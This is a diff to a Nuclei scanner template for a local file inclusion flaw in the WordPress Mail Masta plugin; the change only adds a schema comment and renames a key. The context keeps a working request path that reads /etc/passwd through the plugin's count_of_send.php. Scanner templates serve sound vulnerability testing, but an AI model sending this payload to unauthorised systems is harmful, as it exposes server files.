@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-mail-masta-lfi
 
 info:
@@ -7,7 +8,7 @@ info:
   reference: https://www.exploit-db.com/exploits/40290
   tags: wordpress,wp-plugin,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
